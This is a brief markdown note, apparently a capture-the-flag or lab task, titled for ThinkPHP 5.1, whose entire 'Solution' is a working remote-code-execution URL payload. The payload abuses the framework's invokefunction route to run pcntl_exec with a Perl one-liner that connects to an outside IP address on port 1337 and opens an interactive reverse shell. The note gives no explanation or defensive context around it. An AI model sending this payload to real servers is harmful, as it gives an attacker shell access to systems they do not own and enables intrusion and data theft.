# Task.4.md

## Desc

ThinkPHP 5.1

## Solution

/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=pcntl_exec&vars[1][]=/usr/bin/perl&vars[1][1][]=-e&vars[1][1][]=use Socket;$i="185.186.247.40";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};